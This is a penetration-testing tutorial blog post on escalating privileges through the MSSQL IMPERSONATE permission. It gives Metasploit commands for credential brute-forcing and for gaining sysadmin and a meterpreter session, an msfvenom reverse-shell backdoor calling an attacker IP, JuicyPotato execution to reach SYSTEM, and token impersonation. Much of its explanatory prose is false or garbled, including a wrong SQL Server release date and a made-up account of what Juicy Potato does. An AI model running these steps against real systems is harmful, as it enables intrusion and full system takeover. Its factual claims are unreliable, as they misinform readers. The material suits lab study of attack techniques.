<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Impersonate</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-impersonate/" rel="bookmark"><time class="entry-date published" datetime="2021-08-31T15:58:18+00:00">August 31, 2021</time><time class="updated" datetime="2025-05-10T18:15:55+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn about Impersonate feature that MSSQL servers offer. The earliest implementation of Impersonate was in SQL Server 7.0, released January 1993. This command is used to authenticate a user on behalf of another user. Let’s learn all about it now.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction</span></li>
<li><span style="color: #000000;">Uses of Impersonate property</span></li>
<li><span style="color: #000000;">Security Implications of MSSQL Impersonate</span></li>
<li><span style="color: #000000;">Introduction to Juicy Potato</span></li>
<li><span style="color: #000000;">Enabling Impersonate (GUI)</span></li>
<li><span style="color: #000000;">Exploiting MSSQL via Impersonate</span>
<ul>
<li><span style="color: #000000;">Metasploit</span></li>
</ul>
</li>
<li><span style="color: #000000;">Escalate Privilege</span>
<ul>
<li><span style="color: #000000;">Metasploit and Juicy Potato</span></li>
<li><span style="color: #000000;">Token Impersonation</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">The MSSQL Impersonate command is a way of authenticating against other user names to execute system queries. It’s typically used in conjunction with the CREATE USER statement for this purpose. When you use the impersonation account, SQL Server checks whether you have permissions for all databases referenced by the query.</span></p>
<p><span style="color: #000000;">There are many cases in which it’s necessary to log in as someone else on a computer. For instance, you might not have the administrative privileges required for tasks like installing new software or accessing files that you can’t access without credentials. However, there are times when this is necessary even though you do have the appropriate level of permissions. When this is the case, Microsoft provides an impersonation feature called “Impersonate.” It’s one of those security features that’s built-in and easy to use. This article introduces how you can use it with Microsoft SQL Server Management Studio (SSMS).</span></p>
<p><span style="color: #000000;">You need to understand several things before you go; further, the first is that SQL Server has a login process that requires authentication with a valid user name and password. When you log on as a user, SSMS will prompt for that user’s password. The next thing to understand is the concept of impersonation—you can log in as one user but be logged on as another. This means that if your current login isn’t authorized for the task you want to do, you can switch to a different account through impersonation and still do the job.</span></p>
<h3><span style="color: #800000;">Uses of Impersonate property</span></h3>
<p><span style="color: #000000;">There are multiple uses of the Impersonate property in the MSSQL server. Some of them are listed below:</span></p>
<ul>
<li><span style="color: #000000;">Imagine a client application needs to access a database on the server, but the client doesn’t run under a privileged account. In this case, MSSQL impersonation will enable the client application to access the database without credentials for accessing it on the server. This is useful when architecting Web or file-sharing services where anonymous or unauthenticated users can upload data for other users to download. The client application would access the database without providing credentials by enabling impersonation with an anonymous user account. The only credentials required would be for creating/dropping/replicating tables.</span></li>
</ul>
<h4><span style="color: #000000;">Service Account and Active Directory Compatibility</span></h4>
<ul>
<li><span style="color: #000000;">This property is applicable when you want a service account to access a database. This means that all database connection strings not provided by the service account require impersonating the server instance. With this property set, an administrator would need to adjust all connection strings in one go and ensure that they have been set accordingly with appropriate privileges on each server application.</span></li>
<li><span style="color: #000000;">Another reason for using this property is for compatibility with Active Directory Users and Computers (ADUC). ADUC is a helpful tool for working with accounts and groups in your domain: you can create/delete accounts, enable or disable accounts, set password expirations, and generally manage user objects in your Active Directory (AD) domain. However, ADUC does not allow you to add or update custom data for user objects; instead, it will enable you to edit only the data stored in standard fields such as first name, last name, etc. The impersonate property forces MSSQL to present itself as a member of the Domain Users group within the OS when connecting to the server. This means that users can use ADUC without needing elevated permissions on their workstations.</span></li>
<li><span style="color: #000000;">This property uses the same method as Windows for executing stored procedures (SPs) and triggers on the remote server. This is what SQL Server does when impersonate: it runs user=&lt;user&gt; as the context of TRUST on all remote SPs and triggers. This allows T-SQL users to access the database using their Windows/AD credentials without providing SQL Server credentials on every call.</span></li>
<li><span style="color: #000000;">It can also invoke a database function or stored procedure that uses a specific context user (for example, members of a database role). By setting this property, you can allow users who are added to this group or database role to start impersonating the server with just one connection.</span></li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Security Implications of MSSQL Impersonate</span> </span></h3>
<p><span style="color: #000000;">This property allows a user to impersonate another user in MSSQL and create the other user’s login credentials. The security implications of using this property are that if someone can impersonate you on your database, they can log into any application that requires authentication against your database without needing to know any passwords or personal information about you. This is precisely what we will try and exploit in our article.</span></p>
<h3><span style="color: #800000;">Introduction to Juicy Potato</span></h3>
<p><span style="color: #000000;">We will exploit the <strong data-start="220" data-end="244">Impersonate Property</strong> using two tools: <strong data-start="262" data-end="276">Metasploit</strong> and <strong data-start="281" data-end="297">Juicy Potato</strong>. As you already know, everyone is familiar with <strong data-start="346" data-end="360">Metasploit</strong>. Therefore, I will take this opportunity to introduce <strong data-start="415" data-end="431">Juicy Potato</strong>, which you can download from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/ohpe/juicy-potato/releases">here.</a></strong></span></span></p>
<p><span style="color: #000000;">The <strong data-start="477" data-end="498">Juicy Potato Tool</strong> helps in hacking or impersonating any <strong data-start="537" data-end="550">SQL login</strong> with ease. In particular, <strong data-start="577" data-end="593">Juicy Potato</strong> automatically extracts a user’s username and password from the <strong data-start="657" data-end="671">SQL server</strong> without any problems. Thus, users can hack their own or someone else’s database without encountering errors during the process. Additionally, the latest version saves all extracted information directly on the user’s machine.</span></p>
<p><span style="color: #000000;">Moreover, this tool extracts information from a specific <strong data-start="960" data-end="969">table</strong> or <strong data-start="973" data-end="984">columns</strong> effortlessly. This becomes very useful for <strong data-start="1028" data-end="1042">pentesters</strong> who aim to analyze a <strong data-start="1064" data-end="1076">database</strong> and remove any essential data. It also allows users to log into a <strong data-start="1143" data-end="1155">database</strong> without even knowing the database login credentials. Indeed, this tool is one of its kind, designed to extract all necessary information from <strong data-start="1298" data-end="1312">SQL Server</strong>, <strong data-start="1314" data-end="1323">MySQL</strong>, <strong data-start="1325" data-end="1338">MS Access</strong>, <strong data-start="1340" data-end="1350">Oracle</strong>, and <strong data-start="1356" data-end="1367">IBM DB2</strong> with remarkable ease and speed. Furthermore, it creates access files and scripts for the user’s convenience. The user can customize the output according to his requirements. </span></p>
<p><span style="color: #000000;">Consequently, it allows the user to perform any task with the database using just a single click. Notably, this tool has many features that make it robust and user-friendly. It proves highly beneficial for <strong data-start="1748" data-end="1766">network admins</strong>, administrators, pentesters, and hackers. Moreover, it executes all actions accurately and on time. Finally, its high level of customization allows users to modify everything about <strong data-start="1948" data-end="1964">Juicy Potato</strong> based on their needs, without requiring any PC knowledge or programming expertise.</span></p>
<h3><span style="color: #800000;">Enabling Impersonate (GUI)</span></h3>
<p><span style="color: #000000;">To know how to enable Impersonate property, let us begin from starting by creating a new user. Go to <strong>server&gt;Security&gt;Logins</strong>. Here, right-click on Logins and select the <strong>New Login</strong> option from the drop-down menu that will appear after right-clicking, as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZpE3NHIbXU4/YS4Uwb7akwI/AAAAAAAAyak/jrTDsGEsoYAKUkhHcydKhMbF0Y4IAyquACLcBGAsYHQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">A dialogue box will open; in the dialogue box, give the user login name and password. Make sure the check box for <strong>Enforce password policy</strong> is unchecked, and then click the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d5ZQHd_B-jI/YS484AU1YbI/AAAAAAAAyas/Yzh2bymVKPU7sYmxGTAUPLptc-viXmHvgCLcBGAsYHQ/s16000/51.png"/></span></p>
<p><span style="color: #000000;">And in the right panel, you will find that a new user is created by the name of lowpriv. Now right click on the user. A drop-down menu will appear. From this drop-down menu, click on the <strong>Properties</strong> option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BD1cQ2PaiFQ/YS487yuYaeI/AAAAAAAAyaw/mMNE_YHrl2gSJUMbNjwddsWx_E8team7wCLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">In the properties dialogue box, you can see that the only property enable is public, as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1iCDKhBvyN8/YS49AGt7WTI/AAAAAAAAya0/c_HdScDkmA4qb9IP84hOz8D4hoitKAatACLcBGAsYHQ/s16000/53.png"/></span></p>
<h4><span style="color: #000000;">Enabling the Impersonate Property</span></h4>
<p><span style="color: #000000;">Now in the right panel, you can see that there is an option called <strong>Securables</strong>. Click on that option and then click on the <strong>Search</strong> button. Doing so will open a dialogue box. The dialogue box will offer you three options. Choose <strong>Specific objects</strong> and click on the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4kSDLCPbY08/YS49E1yqqKI/AAAAAAAAya4/RqUJzEUj34YVk-ZTPHBetCiqhh8KAzRowCLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">Another dialogue box will open; in that dialogue box, click on the <strong>Object Types</strong> button, which will open another dialogue box. In this dialogue box, select the <strong>Login</strong> option and then click on the <strong>OK</strong> button as shown in the image:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9tm4GjqmMG0/YS49M4yh7HI/AAAAAAAAybA/CBCEoaEeC-kyvf6l6wQtNwXswZGBim3eQCLcBGAsYHQ/s16000/55.png"/></span></p>
<p><span style="color: #000000;">And then select the user whose login you want to impersonate. In the image below, you can see that we have chosen <strong>sa </strong>user. Once you have set the user, click on the <strong>OK</strong> button.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ac7V-RyhIpk/YS49Xgpg7dI/AAAAAAAAybM/lfMPIpdWXMQROXc0YBeNAoQU-wSFX85BwCLcBGAsYHQ/s16000/56.png"/></span></p>
<p><span style="color: #000000;">Now, if you check the permissions for sa user, you will see that permission to impersonate the user is enabled as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BLVFfNVcEM4/YS49dM9dpvI/AAAAAAAAybU/L8c8QRd00hcoJ1JUh6FGYk1aRFJTMsFpQCLcBGAsYHQ/s16000/57.png"/></span></p>
<h3><span style="color: #800000;">Exploiting MSSQL via Impersonate</span></h3>
<h4><span style="color: #000000;">Metasploit</span></h4>
<p><span style="color: #000000;">To exploit MSSQL via impersonate property, we first have to find the username and password. We can deploy the following exploit that will use the dictionary attack and help us find the credentials of the user:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.1.146
set user_file /root/users.txt
set pass_file /root/pass.txt
set verbose false
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y3eyCyGmmNo/YS49imoRb_I/AAAAAAAAybY/BLEIf-AZYgIW1q7T1pFCP21J0LKsbDYfACLcBGAsYHQ/s16000/58.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image above, we have our credentials. Now, we will check if we can run the mssql_payload exploit. The purpose of doing so is that if this exploits successfully executes itself, that will mean that the given user has the privilege to do so. Otherwise, we will use another exploit to trigger the impersonate feature. To run the said exploit, use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/mssql/mssql_payload
set rhosts 192.168.1.146
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;">As you can see in the image below, the exploit does not run successfully. So now, we will use another exploit that will trigger the enabling of impersonate property. And for that, use the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/widows/mssql/mssql_escalate_execute_as
set rhosts 192.168.1.146
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yb34PwOUGxc/YS49rLa-OLI/AAAAAAAAybg/Cpq4jejXRckU3fDHk04B4irw64RMT-lHACLcBGAsYHQ/s16000/59.png"/></span></p>
<p><span style="color: #000000;">As the result of the above exploit, you can see that the user lowpriv is now the member of sysadmin as it impersonated the sa user. You can even confirm from the properties that now the sa user will be a sysadmin as well. The same has shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6wVTB1GY9cI/YS49x4ZP8rI/AAAAAAAAybo/nTVQAIeZa7ASpGZHihv8_qrQk4ecqjTggCLcBGAsYHQ/s16000/60.1.png"/></span></p>
<p><span style="color: #000000;">Now, if we run the previous exploit, which is mssql_payload, then we will have our meterpreter session as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y-fjcGOXGn8/YS491sfTQQI/AAAAAAAAybs/3ZumD2qdCuYH4so2ub-jzxEPl9l_25nLwCLcBGAsYHQ/s16000/60.png"/></span></p>
<p><span style="color: #000000;">Now that we have the meterpreter session, we can go to <strong>shell</strong> and see what privileges our user has with the help of the command <strong>whoam</strong>i. With the <strong>whoami /priv </strong>command, we can also check if impersonate property is enabled or not; as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yGvKbfXw5Qc/YS495hTFN2I/AAAAAAAAybw/z7HwgKyiZRYaPoBbegpAoWPmqArD6VkjwCLcBGAsYHQ/s16000/61.png"/></span></p>
<h3><span style="color: #800000;">Escalate Privilege</span></h3>
<h4><span style="color: #000000;">Juicy Potato</span></h4>
<p><span style="color: #000000;">Now, to gain <strong>authority\system</strong> access, we will create a backdoor exe file using msfvenom. And for this type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.2 lport=8888 -f exe &gt; backdoor.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-myCf3QwLkRo/YS49_hYDe-I/AAAAAAAAyb0/NxDhmhlUJQcnIR-H0HIIOM_ndG7XWTyjgCLcBGAsYHQ/s16000/62.png"/></span></p>
<p><span style="color: #000000;">As you can see, the file is created. Now we will do two things. First, we will upload the<strong> juicy Potato.</strong> And secondly, we will upload our backdoor.exe. For this, go to the meterpreter session that we had previously acquired. And type the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\\Users\\Public
upload /root/Downloads/JuicyPotato.exe .
upload /root/Downloads/backdoor.exe .</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xup_gA0nqQc/YS4-ES-qInI/AAAAAAAAyb8/4iUJYrXYPF0-Md2xbjWrvX2gRgAsTVY6QCLcBGAsYHQ/s16000/63.png"/></span></p>
<p><span style="color: #000000;">JuicyPotato allows the attacker to shift from SEImpersoalPrivlege to SYSTEM. For this, we need an .exe file that will work as a payload; which we will upload in the Public directory. The upload of .exe file and JuicyPotato exploit will be done through the MSSQL shell. For JuicyPotato to run successfully we will reqiure a CLSID. Such a list is already available in the JuicyPotato’s GitHub repo, especially for each OS. And now we will just execute our following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">JuicyPotato.exe -l 8888 -p backdoor.exe -t * -c {B91D5831-B1BD-4608-8198-D72E155020F7}</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-YG6FIc71I6s/YS4_BOLJDUI/AAAAAAAAyc0/Bjv34OgZFlUvLUEUQosYkeP8Z5aRCzE5QCLcBGAsYHQ/s16000/64.png"/></strong></span></p>
<p><span style="color: #000000;">Once the above command is executed, you can activate a netcat listener to receive a session, as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nSJGliQkuwI/YS4-1T04klI/AAAAAAAAycs/NAPw3ONXK0ouy9x-aSo7TP7fvEtRbCxoQCLcBGAsYHQ/s16000/65.png"/></span></p>
<p><span style="color: #000000;">Once you get your netcat session, you use the <strong>whoami</strong> command to see that now you have access to authority\system, as you can see in the image above.</span></p>
<h4><span style="color: #000000;">Impersonate Token</span></h4>
<p><span style="color: #000000;">Another method to access authority\system is by impersonating the token. To do so, we will load the incognito extension in the meterpreter session, and then we will invoke the lists of tokens from the token list, you can see that there is a SYSTEM token. Now, access through this token is all we need to gain high privileges. To do so, we will impersonate the said token by simply using the impersonate_token command. Once you have successfully impersonated the token, you can confirm it with the whoami command. And for all this, use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
shell
whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Le0Fu9bO_g8/YS4-iuIdn3I/AAAAAAAAycc/BpDXzqJw8JkzugMPnQnro-7o77d0NlG5ACLcBGAsYHQ/s16000/66.png"/></span></p>
<p><span style="color: #000000;">And voila!!! We have the desired access. So through these methods, you can pentest/exploit impersonate property of a user in MSSQL.</span></p>
<p><span style="color: #000000;"><strong>Reference</strong>:https://ohpe.it/juicy-potato/</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong></span>and <span style="color: #0000ff;"><strong>Twitter</strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
